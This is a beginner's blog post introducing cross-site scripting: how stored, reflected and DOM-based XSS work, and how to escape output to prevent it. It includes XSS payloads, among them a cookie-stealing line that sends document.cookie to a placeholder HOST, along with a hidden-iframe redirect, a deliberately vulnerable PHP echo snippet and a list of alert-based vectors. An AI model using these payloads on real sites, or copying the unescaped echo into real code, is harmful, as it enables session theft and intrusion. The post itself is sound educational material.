---
layout:     post
title:      "Cross Site Scripting"
subtitle:   "Introduction to XSS"
date:       2016-08-25 6:00:00
author:     "W3ndige"
header-img: "img/cross-site-scripting-header.jpg"
category: "Web Security"
---
<h1>What is XSS?</h1>
<p>Cross Site Scripting (XSS) is a name of one of the most common vulnerability in web applications. It's third in the list of the newest <a href="https://www.owasp.org/index.php/Top10">OWASP Top Ten</a> document so it's essential to know how it works. </p>
<p>Browsers diplay the content of a website using a mix of HTML (HyperText Markup Language which is a core of a webpage) and JavaScript responsible for making things run in response of events (like clicking a button). Of course there are other essential elements like CSS to style the webpage but in order to perform a XSS attack we will only need HTML and Javascript. </p>
<p>Essence of XSS attack is to inject some malicous code (for example Javascript or other scripting language that can be opened in a browser) into the browser of client using vulnerable web application. That way, an attacker has an ability to execute any malicious code in victim's browser. </p>
<p>But why is it so powerul? Let's consider this example: You're running some simple WordPress website with small audience. As you don't want spammers to make comments under your posts, you enable the option to only publish comments allowed by yourself. In the meantime some malicous hacker wanted to destroy your webpage (who knows why but there are still people like that). He firstly tests if you really have to allow comments, and then injects into the comment box malicious JavaScript code that will steal cookies and send them to him. Now as you've got a notification that someone published a new comment, you open the WordPress admin page to see what someone has written. In the moment you view this comment, this malicous code steals your admin cookie and sends it to the attacker. Few hours later your site has been pawned. </p>
<p>Powefull, right? But enough story time for today, let's jump into some technical details. </p>








<h1>Potential results of XSS attack</h1>
<ul>
<li><b>Stealing session cookies</b>
<p>With that attacker is being able to steal someone's logged session - like in the story.</p>
{% highlight html %}
<svg onload=fetch(‘//HOST/?cookie=’+document.cookie)>
{% endhighlight %}
</li>
<li><b>Substituting a content of a website</b>
<p>Users can be tricked into thinking that "Your site have been hacked".</p>
{% highlight html %}
<svg onload=”document.body.innerHTML='<img src=//HOST/IMAGE>'”>
{% endhighlight %}
</li>
<li><b>Capture the keys pressed by the user</b>
<p>Ability to log what someone is writing... I don't have to say why it's useful ;)</p>

</li>
<li><b>Crash the browser</b>
<p>Local Denial Of Service Attack. Mostly frustrating.</p>
</li>
<li>
<b>Redirect user’s browser to another website</b>
<p>Attacker can redirect the browser to another webpage that may be prepared with some customized malware ready to attack victims operating system. </p>
{% highlight html %}
<iframe src=//HOST/ style=display:none></iframe>
{% endhighlight %}
</li>
<li>
<b>Creating fake HTML form</b>
<p>Where an attacker would be able to trick user into entering their credentials and form would send them to an attacker. </p>
</li>
</ul>

<h1>Types of XSS attacks</h1>
<p><b>Persistent (stored) XSS</b> - This type of attack relies on the fact that webpage may store some input, or file in a database. Just like in our story, comments were stored in the WordPress database. It consists of injecting the javascript code into the server side. That's why it's called stored. Every user that sees this stored content is a potential victim. </p>
<p><b>Reflected XSS</b> - When the website or application just reflects back content maliciously manipulated by user (usually in the URL), we have a reflected XSS attack. Victim usually unwittingly opens a link with some JavaScript code which is sent to the web application. Then this application sends back (that's why reflected) whatever the victim asked for with this JavaScript code resulting in executing it in the browser. </p>
<p>Let's take a look at this simple PHP code: </p>
{% highlight php %}
$username = $_GET[‘user’];
echo “<h1>Welcome, ” . $username . “!</h1>”;
{% endhighlight %}
<p>Which would take an username from the URL just like that: </p>
{% highlight html %}
http://example.com/welcome.php?user=Mike
{% endhighlight %}
<p>If you open the web and view the source code it would look like this</p>
{% highlight html %}
<h1>Hello, John!</h1>
{% endhighlight %}
<p>But what if we swap the name with some JavaScript code? </p>
{% highlight html %}
http://example.com/welcome.php?user=<script>alert("XSS")</script>
{% endhighlight %}
<p>After checking the source code of the same webpage opened with this URL, you would notice that the alert box with "XSS" text was triggered.   </p>
{% highlight html %}
<h1>Hello, <script>alert("XSS")</script>!</h1>
{% endhighlight %}
<p>Now with that knowledge you can enter some more malicous code. Reflected XSS attack ready ;)</p>

<p><b>DOM Based XSS</b> is an attack where the malicious code is executed as a result of modyfing DOM (Document Object Model). It's rarest type of XSS attack. Read more at <a href="https://www.owasp.org/index.php/DOM_Based_XSS">OWASP</a>.</p>

<h1>XSS Examples</h1>
<p><b>1. With script tag</b></p>
{% highlight html %}
<script>alert("XSS")</script>
{% endhighlight %}
<p><b>2. With body tag</b></p>
{% highlight html %}
<p><body onload=alert("XSS")></p>
{% endhighlight %}
<p><b>3. With img tag</b></p>
{% highlight html %}
<p><img src="blabla" onerror="alert("XSS")></img></p>
{% endhighlight %}
<p><b>4. Or any other tag</b></p>
{% highlight html %}
<svg onload=alert("XSS")>
{% endhighlight %}
{% highlight html %}
<x onmouseover=alert("XSS")>
{% endhighlight %}
<p><b>5. Resource tag like iframe</b></p>
{% highlight html %}
<iframe src=javascript:alert("XSS")>
{% endhighlight %}
<p><b>6. Or object tag</b></p>
{% highlight html %}
<object data=javascript:alert("XSS")>
{% endhighlight %}
<h1>How to prevent XSS?</h1>
<p>All right, as we know how XSS attacks works, let's move on to prevention. Essential thing to do is to filter any data sent from the user before viewing them in application (like "<" and ">", tag attributes or HTML entities ). </p>
{% highlight html %}
& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;     
/ --> &#x2F;
{% endhighlight %}
<p>That method will prevent most of the XSS attacks but for the most sophisticated ones it may be helpful to read <a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">XSS Prevention Sheet</a>. Another helpful thing would be prevention on the client side - like installing NoScript addition. </p>

<p>As always - thanks for reading and exploring this topic with me. Now after better understanding of XSS we can look for vulnerabilities in many different web applications. Good luck and...</p>
<p>~ Stay safe! </p>
